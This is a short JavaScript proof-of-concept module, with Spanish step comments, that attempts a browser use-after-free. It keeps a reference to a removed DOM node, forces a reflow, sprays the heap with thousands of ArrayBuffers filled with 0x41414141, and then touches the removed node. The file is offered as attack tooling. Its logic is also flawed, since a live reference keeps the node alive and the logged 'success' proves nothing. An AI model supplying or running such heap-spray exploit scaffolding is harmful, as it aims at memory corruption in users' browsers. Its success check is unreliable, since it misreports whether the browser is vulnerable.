import { debug_log } from './module/utils.mjs';

const container = document.querySelector(".container");
let child = document.querySelector(".child");
let danglingRef = null;

function heapSpray() {
  const spray = [];
  const pattern = 0x41414141;

  for (let i = 0; i < 50000; i++) {
    let buffer = new ArrayBuffer(0x100);
    let view = new Uint32Array(buffer);
    view.fill(pattern);
    spray.push(view);
  }

  debug_log(`Heap spray with ${spray.length} buffers completed.`);
  return spray;
}

export function triggerUAF() {
  if (!container || !child) {
    debug_log("Missing container or child element.");
    return;
  }

  // Paso 1: guardar referencia colgante
  danglingRef = child;

  // Paso 2: remover el objeto del DOM
  container.removeChild(child);
  debug_log("Child removed, reference dangling.");

  // Paso 3: forzar reflow (para liberar memoria)
  document.body.offsetHeight;

  // Paso 4: ejecutar spray tras retardo
  setTimeout(() => {
    const spray = heapSpray();

    // Paso 5: intentar acceso a objeto eliminado
    try {
      danglingRef.style.background = "red";
      debug_log("✅ Access to dangling reference succeeded (possible UAF).");
    } catch (e) {
      debug_log("❌ Access to dangling reference failed: " + e.message);
    }

    debug_log("PoC completed — check for crash, log, or corruption.");
  }, 100); // aumentar si no ves efecto
}
